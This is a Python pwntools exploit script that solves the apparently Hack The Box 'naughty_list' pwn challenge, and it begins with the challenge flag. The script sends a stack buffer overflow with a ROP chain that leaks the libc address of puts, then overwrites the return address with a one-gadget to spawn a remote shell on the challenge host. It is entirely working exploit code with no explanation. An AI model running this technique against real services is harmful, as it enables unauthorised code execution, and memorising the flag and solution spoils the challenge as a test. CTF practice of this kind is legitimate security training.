#HTB{u_w1ll_b3_n4ughtyf13d_1f_u_4r3_g3tt1ng_4_g1ft}

from pwn import *

local = False

host,port = '68.183.40.128','30931'
context(terminal=['tmux','new-window'])                                                                           
libc = ELF('./libc.so.6') if not local else ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')


puts_off = libc.sym.puts 


p = ELF('./naughty_list')
r = process('./naughty_list') if local else remote(host,port)
pop_rdi = 0x0000000000401443

gets_code = 0x00000000004013af

def send_name():
	log.info(r.recvuntil(':'))
	r.sendline('X'*8)

def send_surname():
	log.info(r.recvuntil(':'))
	r.sendline('X'*8)

def send_age():
	log.info(r.recvuntil(':'))
	r.sendline('20')


def exploit_leak():
	log.info(r.recvuntil(':'))
	for i in range(3):
		log.info(r.recvuntil(':'))
	
	#gdb.attach(r)
	r.sendline(b'a'*40+p64(pop_rdi)+p64(p.got['puts'])+p64(p.plt['puts'])+p64(gets_code))
			
	log.info(r.recvline())
	log.info(r.recvline())
	addr_puts=u64(r.recvline()[:-1]+b'\x00'*2)
	
	print('puts = {}'.format(hex(addr_puts)))
	libc.address = addr_puts - puts_off
	

def exploit_final():
	log.info(r.recvuntil(':'))
	for i in range(3):
		log.info(r.recvuntil(':'))
	str_sh = next(libc.search(b'/bin/sh'))	
	#gdb.attach(r)
	magic=0x10a41c+libc.address
	r.sendline(b'a'*40+p64(magic))

if __name__=='__main__':
	send_name()
	send_surname()
	send_age()
	exploit_leak()
	send_name()
	send_surname()
	send_age()
	exploit_final()
	

	r.interactive()





